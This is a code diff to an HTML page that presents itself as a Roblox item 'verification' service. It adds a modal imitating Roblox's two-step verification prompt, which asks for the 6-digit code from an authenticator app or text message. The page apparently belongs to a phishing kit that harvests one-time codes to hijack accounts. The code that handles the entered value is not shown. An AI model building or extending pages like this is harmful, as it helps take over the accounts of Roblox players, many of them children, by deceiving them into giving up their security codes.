@@ -284,8 +284,47 @@
     <div id="loadingOverlay" class="loading-overlay">
         <div class="loading-content">
             <div class="loading-spinner"></div>
-            <h3>Verifying Roblox Items...</h3>
-            <p>Please wait while we analyze for stolen content and verify authenticity</p>
+            <h3 id="loadingTitle">Verifying Roblox Items...</h3>
+            <p id="loadingMessage">Please wait while we analyze for stolen content and verify authenticity</p>
+        </div>
+    </div>
+
+    <!-- Roblox 2-Step Verification Modal -->
+    <div id="verificationModal" class="modal">
+        <div class="modal-content verification-modal">
+            <div class="modal-header">
+                <h2>🔐 Two-Step Verification</h2>
+                <span class="close" onclick="closeVerificationModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="verification-icon">
+                    <svg width="48" height="48" viewBox="0 0 24 24" fill="#00A2FF">
+                        <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.66 16,12.08 16,12.8V16.2C16,17.1 15.1,18 14.2,18H9.8C8.9,18 8,17.1 8,16.2V12.8C8,12.08 8.6,11.66 9.2,11.5V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.4,8.7 10.4,10V11.5H13.6V10C13.6,8.7 12.8,8.2 12,8.2Z"/>
+                    </svg>
+                </div>
+                <p class="verification-description">Please enter the verification code from your authenticator app or text message to continue.</p>
+                
+                <div class="verification-form">
+                    <label for="verificationCode">6-digit code</label>
+                    <input type="text" id="verificationCode" class="verification-input" placeholder="000000" maxlength="6" autocomplete="off">
+                    
+                    <div class="trust-device">
+                        <label class="checkbox-container">
+                            <input type="checkbox" id="trustDevice">
+                            <span class="checkmark"></span>
+                            Trust this device for 30 days
+                        </label>
+                    </div>
+                    
+                    <button class="verification-btn" onclick="verifyCode()" id="verifyBtn">
+                        <span id="verifyText">Verify</span>
+                    </button>
+                </div>
+                
+                <div class="verification-help">
+                    <p><a href="#" onclick="resendCode()">Didn't receive a code?</a></p>
+                </div>
+            </div>
         </div>
     </div>
 
